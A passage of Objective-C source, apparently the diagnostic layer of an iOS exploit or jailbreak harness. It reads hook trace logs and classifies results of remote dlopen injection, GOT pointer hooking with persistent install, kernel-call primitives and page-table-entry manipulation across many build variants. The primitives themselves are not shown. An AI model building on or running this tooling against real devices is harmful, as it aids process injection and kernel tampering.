        || [event isEqualToString:@"BUILD102738W_PROBE_ENTER"]
        || [event isEqualToString:@"BUILD102738X_PROBE_ENTER"]
        || [event isEqualToString:@"BUILD102738Y_PROBE_ENTER"]
        || [event isEqualToString:@"BUILD102738Z_PROBE_ENTER"])
        obs->got_probe_entered = YES;
    else if ([event isEqualToString:@"GOT_PROBE_TERMINAL_PASS"])
        obs->got_probe_terminal_pass = YES;
    else if ([event isEqualToString:@"GOT_PROBE_TERMINAL_FAIL"])
        obs->got_probe_terminal_fail = YES;
    else if ([event isEqualToString:@"GOT_PROTECTION_RESTORE_PASS"])
        obs->got_restore_pass = YES;
    else if ([event isEqualToString:@"GOT_PROTECTION_RESTORE_FATAL"])
        obs->got_restore_fatal = YES;
    else if ([event isEqualToString:@"GOT_POINTER_UNCHANGED_PASS"])
        obs->got_pointer_unchanged = YES;
    else if ([event isEqualToString:@"GOT_PRESTORE_MATCH_PASS"])
        obs->got_prestore_match = YES;
    else if ([event isEqualToString:@"GOT_SAME_VALUE_STORE_PASS"])
        obs->got_same_value_store_pass = YES;
    else if ([event isEqualToString:@"GOT_WRAPPER_STORE_PASS"])
        obs->got_wrapper_store_pass = YES;
    else if ([event isEqualToString:@"GOT_ORIGINAL_RESTORE_PASS"])
        obs->got_original_restore_pass = YES;
    else if ([event isEqualToString:@"GOT_WRAPPER_ROUNDTRIP_PASS"])
        obs->got_wrapper_roundtrip_pass = YES;
    else if ([event isEqualToString:@"GOT_WRAPPER_INVOKED_PASS"])
        obs->got_wrapper_invoked_pass = YES;
    else if ([event isEqualToString:@"GOT_WRAPPER_INVOCATION_PROOF_PASS"])
        obs->got_wrapper_invocation_proof_pass = YES;
    else if ([event isEqualToString:@"GOT_WRAPPER_PERSISTENT_INSTALL_PASS"])
        obs->got_wrapper_persistent_install_pass = YES;

    BOOL value_ok = NO;
    long long value = dt102735d_value_from_line(line, &value_ok);
    if ([event isEqualToString:@"PTE_HANDOFF_CLIENT_REPLY_RECEIVED"]) {
        obs->pte_client_reply_received = YES;
    } else if ([event isEqualToString:@"PTE_HANDOFF_CLIENT_RESULT_VALUE"] && value_ok) {
        obs->pte_client_reply_decoded = YES;
        obs->pte_client_result_value = (int)value;
    } else if ([event isEqualToString:@"PTE_HANDOFF_CLIENT_ASID_PTR"] && value_ok) {
        obs->pte_client_asid_ptr = (uint64_t)value;
        obs->pte_client_asid_ptr_valid = value != 0;
    } else if ([event isEqualToString:@"GOT_WRAPPER_INVOCATION_COUNT_BEFORE"]
        && value_ok) {
        obs->got_wrapper_invocation_count_before = (uint64_t)value;
    } else if ([event isEqualToString:@"GOT_WRAPPER_INVOCATION_COUNT_AFTER"]
        && value_ok) {
        obs->got_wrapper_invocation_count_after = (uint64_t)value;
    } else if ([event isEqualToString:@"PTE_HANDOFF_CLIENT_DECODE_FAIL"]) {
        obs->pte_client_reply_decoded = NO;
    }

    dt102735d_note_failure(obs, event);

    if (!obs->terminal_observed && dt102735d_event_is_terminal(event)) {
        obs->terminal_observed = YES;
        obs->hook_terminal_timestamp = [[NSDate date] timeIntervalSince1970];
    }
}

static void dt102735d_observe_trace_once(const dt102735d_trace_ctx_t *ctx,
    dt102735d_trace_observation_t *obs, NSMutableString *content)
{
    if (!ctx || !obs || !ctx->trace_path[0])
        return;
    struct stat st;
    int read_rc = 0;
    NSData *data = dt102735d_read_regular_file(ctx->trace_path, &st, &read_rc);
    if (read_rc != 0 || !data)
        return;

    obs->trace_present = YES;
    obs->inode_matches = st.st_dev == ctx->dev && st.st_ino == ctx->ino;
    obs->trace_fresh = obs->inode_matches && data.length >= ctx->header_len
        && memcmp(data.bytes, ctx->header, ctx->header_len) == 0;
    if (!obs->trace_fresh)
        return;
    if ((off_t)data.length > (off_t)ctx->header_len)
        obs->hook_append_observed = YES;

    if (obs->next_offset < (off_t)ctx->header_len)
        obs->next_offset = (off_t)ctx->header_len;
    if (obs->next_offset >= (off_t)data.length)
        return;

    const uint8_t *bytes = data.bytes;
    NSUInteger start = (NSUInteger)obs->next_offset;
    NSUInteger len = data.length;
    NSUInteger line_start = start;
    NSUInteger last_complete = start;
    for (NSUInteger i = start; i < len; i++) {
        if (bytes[i] != '\n')
            continue;
        NSUInteger line_len = i - line_start;
        if (line_len > 0) {
            NSString *line = [[NSString alloc] initWithBytes:bytes + line_start
                length:line_len encoding:NSUTF8StringEncoding];
            if (line.length && ([line hasPrefix:@"BUILD=102735 EVENT="]
                || [line hasPrefix:@"BUILD=102737 EVENT="]
                || [line hasPrefix:@"BUILD=102738 EVENT="])) {
                dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_RECORD=%@",
                    line] UTF8String]);
                if (content) {
                    [content appendString:line];
                    [content appendString:@"\n"];
                }
                dt102735d_update_observation(obs, line);
            }
        }
        last_complete = i + 1;
        line_start = i + 1;
    }
    obs->next_offset = (off_t)last_complete;
}

static void dt102735d_boomerang_log(void (^log)(NSString *line), NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static int dt102735d_poll_trace_and_boomerang(const dt102735d_trace_ctx_t *ctx,
    dt681_boomerang_info_t *boomerang, void (^log)(NSString *line),
    dt102735d_trace_observation_t *obs)
{
    if (!ctx || !boomerang || !obs)
        return -1;
    memset(obs, 0, sizeof(*obs));
    obs->next_offset = (off_t)ctx->header_len;
    obs->boomerang_wait_rc = -2;
    obs->observation_begin_timestamp = [[NSDate date] timeIntervalSince1970];
    NSMutableString *content = [NSMutableString string];

    BOOL done = NO;
    for (int i = 0; i <= 150; i++) {
        dt102735d_observe_trace_once(ctx, obs, content);
        if (boomerang->done
            && dispatch_semaphore_wait(boomerang->done, DISPATCH_TIME_NOW) == 0) {
            done = YES;
            obs->boomerang_wait_rc = 0;
            dt102735d_boomerang_log(log, @"KCALL681_BOOMERANG_DONE");
            [[DTRunLogger shared] logStage:@"KCALL681_BOOMERANG_DONE"];
            dt102735d_observe_trace_once(ctx, obs, content);
#if DT_BUILD_NUM != 102738
            break;
#endif
        }
        if (obs->terminal_observed)
            break;
        if (i == 150)
            break;
        usleep(100000);
    }
#if DT_BUILD_NUM == 102738
    if (!done) {
        obs->boomerang_wait_rc = -2;
        dt102735d_boomerang_log(log, @"KCALL681_BOOMERANG_TIMEOUT");
    }
    if (!obs->terminal_observed) {
        obs->observation_timeout_timestamp = [[NSDate date] timeIntervalSince1970];
        dt102735d_boomerang_log(log, @"BUILD102738P_HOOK_TERMINAL_TIMEOUT");
    }
    dt102735d_observe_trace_once(ctx, obs, content);
#else
    if (!done) {
        obs->boomerang_wait_rc = -2;
        if (!obs->terminal_observed) {
            obs->observation_timeout_timestamp = [[NSDate date] timeIntervalSince1970];
            dt102735d_boomerang_log(log, @"KCALL681_BOOMERANG_TIMEOUT");
        }
        dt102735d_observe_trace_once(ctx, obs, content);
    }
#endif

    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PRESENT=%s",
        dt102735d_yesno(obs->trace_present)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_INODE_MATCHES_PREFLIGHT=%s",
        dt102735d_yesno(obs->inode_matches)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_FRESH=%s",
        dt102735d_yesno(obs->trace_fresh)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_HOOK_APPEND_OBSERVED=%s",
        dt102735d_yesno(obs->hook_append_observed)] UTF8String]);
    dt699_stage("BUILD102735D_TRACE_CONTENT_BEGIN");
    for (NSString *line in [content componentsSeparatedByString:@"\n"]) {
        if (line.length)
            dt699_stage(line.UTF8String);
    }
    dt699_stage("BUILD102735D_TRACE_CONTENT_END");
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_APP_BOOMERANG_WAIT_RC=%d",
        obs->boomerang_wait_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_APP_BOOMERANG_DONE_OBSERVED=%s",
        dt102735d_yesno(obs->boomerang_wait_rc == 0)] UTF8String]);
    return obs->boomerang_wait_rc;
}

static const char *dt102735d_classify_result(int remote_rc,
    const dt102735d_trace_observation_t *obs)
{
    if (remote_rc != 0)
        return "REMOTE_DLOPEN_FAIL";
    if (!obs || !obs->hook_append_observed)
        return "NO_HOOK_TRACE_AFTER_REMOTE_DLOPEN";
    if (obs->failure_result[0])
        return obs->failure_result;
    if (obs->boomerang_done_send_pass && obs->boomerang_wait_rc != 0)
        return "BOOMERANG_SENT_APP_NOT_RECEIVED";
    if (obs->ctor_return_pass && !obs->boomerang_done_send_pass)
        return "CONSTRUCTOR_RETURNED_WITHOUT_BOOMERANG";
    if (obs->primitives_init_pass && obs->boomerang_done_send_pass
        && obs->boomerang_wait_rc == 0 && obs->ctor_return_pass)
        return "CONSTRUCTOR_BOOMERANG_ONLY_PASS";
    return "INCONCLUSIVE";
}

static void dt102735d_emit_runtime_summary(const dt102735d_trace_ctx_t *ctx, int remote_rc,
    const dt102735d_trace_observation_t *obs, const char *result)
{
    const char *last_event = (obs && obs->last_event[0]) ? obs->last_event : "NONE";
    const char *last_stage = (obs && obs->last_confirmed_stage[0])
        ? obs->last_confirmed_stage : "NONE";
    const char *stop = result ? result : "INCONCLUSIVE";
    if (obs && obs->failure_result[0])
        stop = obs->failure_result;
    else if (obs && obs->actual_stop_point[0])
        stop = obs->actual_stop_point;

    const char *constructor_entered = "UNPROVEN";
    if (obs && obs->hook_append_observed)
        constructor_entered = obs->constructor_entered ? "YES" : "NO";

    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_CANONICAL_BASEBIN_PATH=%s",
        ctx && ctx->basebin_path[0] ? ctx->basebin_path : "UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PATH=%s",
        ctx && ctx->trace_path[0] ? ctx->trace_path : "UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_REMOTE_DLOPEN_RC=%d",
        remote_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_HOOK_TRACE_APPEND_OBSERVED=%s",
        dt102735d_yesno(obs && obs->hook_append_observed)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_CONSTRUCTOR_ENTERED=%s",
        constructor_entered] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_LAST_TRACE_EVENT=%s",
        last_event] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_LAST_CONFIRMED_HOOK_STAGE=%s",
        last_stage] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_BOOMERANG_DONE_SEND_PASS=%s",
        dt102735d_yesno(obs && obs->boomerang_done_send_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_APP_BOOMERANG_WAIT_RC=%d",
        obs ? obs->boomerang_wait_rc : -1] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_APP_BOOMERANG_DONE_OBSERVED=%s",
        dt102735d_yesno(obs && obs->boomerang_wait_rc == 0)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_ACTUAL_STOP_POINT=%s",
        stop] UTF8String]);
}

#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
static int dt102737d_read_int_symbol(const char *name, int fallback)
{
    int *p = (int *)dlsym(RTLD_DEFAULT, name);
    return p ? *p : fallback;
}

static uint64_t dt102737d_read_u64_symbol(const char *name, uint64_t fallback)
{
    uint64_t *p = (uint64_t *)dlsym(RTLD_DEFAULT, name);
    return p ? *p : fallback;
}

static const char *dt102737d_server_stage_name(int stage)
{
    switch (stage) {
    case 1: return "PROC_RESOLUTION";
    case 2: return "TASK_RESOLUTION";
    case 3: return "TASK_VMMAP";
    case 4: return "VMMAP_PMAP";
    case 5: return "PMAP_TTEP_READ";
    case 6: return "PTE_EXPAND";
    case 7: return "MAGIC_PTE";
    case 8: return "ASID_PTR";
    case 9: return "HANDOFF_SERIALIZE";
    case 10: return "REPLY_DICTIONARY";
    case 11: return "REPLY_SEND";
    default: return "NONE";
    }
}

static const char *dt102737d_pte_server_result_from_rc(int rc)
{
    switch (rc) {
    case -1:
    case -2:
        return "PTE_SERVER_PROC_FAIL";
    case -3:
        return "PTE_SERVER_TASK_FAIL";
    case -4:
        return "PTE_SERVER_VMMAP_FAIL";
    case -5:
        return "PTE_SERVER_PMAP_FAIL";
    case -6:
        return "PTE_SERVER_EXPAND_FAIL";
    case -7:
        return "PTE_SERVER_MAGIC_PTE_FAIL";
    default:
        return NULL;
    }
}

static const char *dt102737d_classify_result(int remote_rc,
    const dt102735d_trace_observation_t *obs, const dt681_boomerang_info_t *boomerang)
{
#if DT_BUILD_NUM == 102738
    if (remote_rc != 0)
        return "REMOTE_DLOPEN_FAIL";
    if (obs && obs->got_restore_fatal)
        return "GOT_PROTECTION_RESTORE_FATAL";
    if (obs && obs->got_probe_terminal_pass && obs->got_restore_pass
#if !defined(DT_BUILD102738Z_VARIANT) && !defined(DT_BUILD102739A_VARIANT) \
    && !defined(DT_BUILD102739B_VARIANT) && !defined(DT_BUILD102739C_VARIANT)
        && obs->got_pointer_unchanged
#endif
        && obs->ctor_exit_reached
        && obs->ctor_return_pass && obs->primitives_init_pass
        && obs->boomerang_done_send_pass && obs->boomerang_wait_rc == 0) {
#if defined(DT_BUILD102738Z_VARIANT) || defined(DT_BUILD102739A_VARIANT) \
    || defined(DT_BUILD102739B_VARIANT) || defined(DT_BUILD102739C_VARIANT)
        if (obs->got_wrapper_store_pass && obs->got_wrapper_persistent_install_pass)
            return "GOT_WRAPPER_PERSISTENT_INSTALL_PASS";
#elif defined(DT_BUILD102738Y_VARIANT)
        if (obs->got_wrapper_store_pass && obs->got_original_restore_pass
            && obs->got_wrapper_invoked_pass
            && obs->got_wrapper_invocation_proof_pass
            && obs->got_wrapper_invocation_count_after
                > obs->got_wrapper_invocation_count_before)
            return "GOT_WRAPPER_INVOCATION_PROOF_PASS";
#elif defined(DT_BUILD102738X_VARIANT)
        if (obs->got_prestore_match && obs->got_wrapper_store_pass
            && obs->got_original_restore_pass && obs->got_wrapper_roundtrip_pass)
            return "GOT_WRAPPER_ROUNDTRIP_PASS";
#elif defined(DT_BUILD102738W_VARIANT)
        if (obs->got_prestore_match && obs->got_same_value_store_pass)
            return "GOT_SAME_VALUE_STORE_PASS";
#else
        return "GOT_PROTECTION_ONLY_PASS";
#endif
    }
    if (obs && obs->failure_result[0])
        return obs->failure_result;
    if (obs && obs->got_probe_terminal_fail)
        return "GOT_PROTECTION_PROBE_FAIL";
#else
    if (remote_rc != 0)
        return "INCONCLUSIVE";
    if (obs && obs->primitives_init_pass && obs->boomerang_done_send_pass
        && obs->boomerang_wait_rc == 0 && obs->ctor_return_pass)
        return "CONSTRUCTOR_BOOMERANG_ONLY_PASS";
#endif

    int server_reached = dt102737d_read_int_symbol("dt102737d_server_pte_request_reached",
        boomerang ? boomerang->build102737d_pte_request_reached : 0);
    if (!server_reached)
        return "PTE_REQUEST_NOT_RECEIVED_BY_SERVER";

    int server_rc = dt102737d_read_int_symbol("dt102737d_server_last_rc", -9999);
    const char *server_result = dt102737d_pte_server_result_from_rc(server_rc);
    if (server_result)
        return server_result;

    int server_generated = dt102737d_read_int_symbol("dt102737d_server_handoff_generated",
        0);
    int server_reply_sent = dt102737d_read_int_symbol("dt102737d_server_reply_sent",
        boomerang ? boomerang->build102737d_pte_server_reply_sent : 0);
    if (!server_generated)
        return "INCONCLUSIVE";
    if (!server_reply_sent)
        return "PTE_SERVER_REPLY_FAIL";
    if (!obs || !obs->pte_client_reply_received)
        return "PTE_CLIENT_REPLY_NOT_RECEIVED";
    if (!obs->pte_client_reply_decoded)
        return "PTE_CLIENT_DECODE_FAIL";
    if (obs->pte_client_result_value == 0 && !obs->pte_client_asid_ptr_valid)
        return "PTE_CLIENT_ASID_INVALID";
    return "PTE_HANDOFF_PASS_LATER_STAGE_FAIL";
}

static void dt102737d_emit_runtime_summary(const dt102735d_trace_observation_t *obs,
    const dt681_boomerang_info_t *boomerang, int remote_rc, const char *result,
    NSTimeInterval wall2_apply_ts, NSTimeInterval remote_return_ts,
    NSTimeInterval restore_begin_ts, NSTimeInterval restore_end_ts, int restore_r)
{
    int server_reached = dt102737d_read_int_symbol("dt102737d_server_pte_request_reached",
        boomerang ? boomerang->build102737d_pte_request_reached : 0);
    int server_generated = dt102737d_read_int_symbol("dt102737d_server_handoff_generated",
        0);
    int server_reply_sent = dt102737d_read_int_symbol("dt102737d_server_reply_sent",
        boomerang ? boomerang->build102737d_pte_server_reply_sent : 0);
    int server_stage = dt102737d_read_int_symbol("dt102737d_server_last_stage", 0);
    int server_rc = dt102737d_read_int_symbol("dt102737d_server_last_rc", -9999);
    uint64_t server_asid = dt102737d_read_u64_symbol("dt102737d_server_asid_ptr", 0);
    uint64_t client_asid = obs ? obs->pte_client_asid_ptr : 0;
    if (!client_asid)
        client_asid = server_asid;

    BOOL terminal_or_timeout = (obs && obs->terminal_observed)
        || (obs && obs->observation_timeout_timestamp > 0.0)
        || remote_rc != 0;
    BOOL wall2_active_during_pte = server_reached && restore_begin_ts > 0.0
        && (!obs || obs->hook_terminal_timestamp == 0.0
            || restore_begin_ts >= obs->hook_terminal_timestamp);

    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_APPLY_TIMESTAMP=%.3f",
        wall2_apply_ts] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_REMOTE_DLOPEN_RETURN_TIMESTAMP=%.3f",
        remote_return_ts] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_OBSERVATION_WINDOW_BEGIN_TIMESTAMP=%.3f",
        obs ? obs->observation_begin_timestamp : 0.0] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_HOOK_TERMINAL_TIMESTAMP=%.3f",
        obs ? obs->hook_terminal_timestamp : 0.0] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_OBSERVATION_TIMEOUT_TIMESTAMP=%.3f",
        obs ? obs->observation_timeout_timestamp : 0.0] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_RESTORE_BEGIN_TIMESTAMP=%.3f",
        restore_begin_ts] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_RESTORE_END_TIMESTAMP=%.3f",
        restore_end_ts] UTF8String]);
    dt699_stage([[NSString stringWithFormat:
        @"BUILD102737D_WALL2_RESTORE_AFTER_HOOK_TERMINAL_OR_TIMEOUT=%s",
        dt102735d_yesno(terminal_or_timeout && restore_begin_ts > 0.0)] UTF8String]);
    dt699_stage("BUILD102737D_WALL2_RESTORE_ATTEMPTED=YES");
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_ORIGINAL_STATE_RESTORED=%s",
        restore_r == 0 ? "YES" : "NO"] UTF8String]);

    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_REMOTE_DLOPEN_RC=%d",
        remote_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_CONSTRUCTOR_ENTERED=%s",
        dt102735d_yesno(obs && obs->constructor_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_ACTIVE_DURING_PTE_REQUEST=%s",
        dt102735d_yesno(wall2_active_during_pte)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_REQUEST_REACHED_SERVER=%s",
        dt102735d_yesno(server_reached)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_SERVER_HANDOFF_GENERATED=%s",
        dt102735d_yesno(server_generated)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_SERVER_LAST_STAGE=%s",
        dt102737d_server_stage_name(server_stage)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_SERVER_LAST_RC=%d",
        server_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_SERVER_REPLY_SENT=%s",
        dt102735d_yesno(server_reply_sent)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_CLIENT_REPLY_RECEIVED=%s",
        dt102735d_yesno(obs && obs->pte_client_reply_received)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_CLIENT_DECODED=%s",
        dt102735d_yesno(obs && obs->pte_client_reply_decoded)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_CLIENT_ASID_PTR=0x%llx",
        (unsigned long long)client_asid] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_PTE_CLIENT_ASID_PTR_VALID=%s",
        dt102735d_yesno(client_asid != 0)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_LAST_HOOK_TRACE_EVENT=%s",
        obs && obs->last_event[0] ? obs->last_event : "NONE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_ACTUAL_STOP_POINT=%s",
        obs && obs->failure_result[0] ? obs->failure_result :
        (obs && obs->actual_stop_point[0] ? obs->actual_stop_point : "INCONCLUSIVE")]
        UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PROBE_ENTERED=%s",
        dt102735d_yesno(obs && obs->got_probe_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PROBE_TERMINAL_PASS=%s",
        dt102735d_yesno(obs && obs->got_probe_terminal_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PROTECTION_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PROTECTION_RESTORE_FATAL=%s",
        dt102735d_yesno(obs && obs->got_restore_fatal)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_POINTER_UNCHANGED=%s",
        dt102735d_yesno(obs && obs->got_pointer_unchanged)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_CTOR_EXIT_REACHED=%s",
        dt102735d_yesno(obs && obs->ctor_exit_reached)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#ifdef DT_BUILD102739C_VARIANT
#ifdef DT_BUILD102739D_VARIANT
#ifdef DT_BUILD102739J_VARIANT
    dt699_stage([[NSString stringWithFormat:@"BUILD102739J_WALL2_GOT_ORIGINAL_STATE_RESTORED=%s",
        restore_r == 0 ? "YES" : "NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739J_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739J_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739J_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
#ifdef DT_BUILD102739K_VARIANT
    dt699_stage([[NSString stringWithFormat:@"BUILD102739K_RUNTIME_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#else
    dt699_stage([[NSString stringWithFormat:@"BUILD102739J_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#endif
#elif defined(DT_BUILD102739I_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739I_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739I_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739I_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739I_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739I_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739H_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739H_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739H_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739H_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739H_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739H_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739G_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739G_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739G_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739G_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739G_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739G_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739F_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739F_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739F_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739F_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739F_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739F_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739E_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739E_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739E_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739E_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739E_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739E_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#else
    dt699_stage([[NSString stringWithFormat:@"BUILD102739D_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739D_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739D_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739D_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739D_FINAL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#endif
#endif
    dt699_stage([[NSString stringWithFormat:@"BUILD102739C_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739C_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
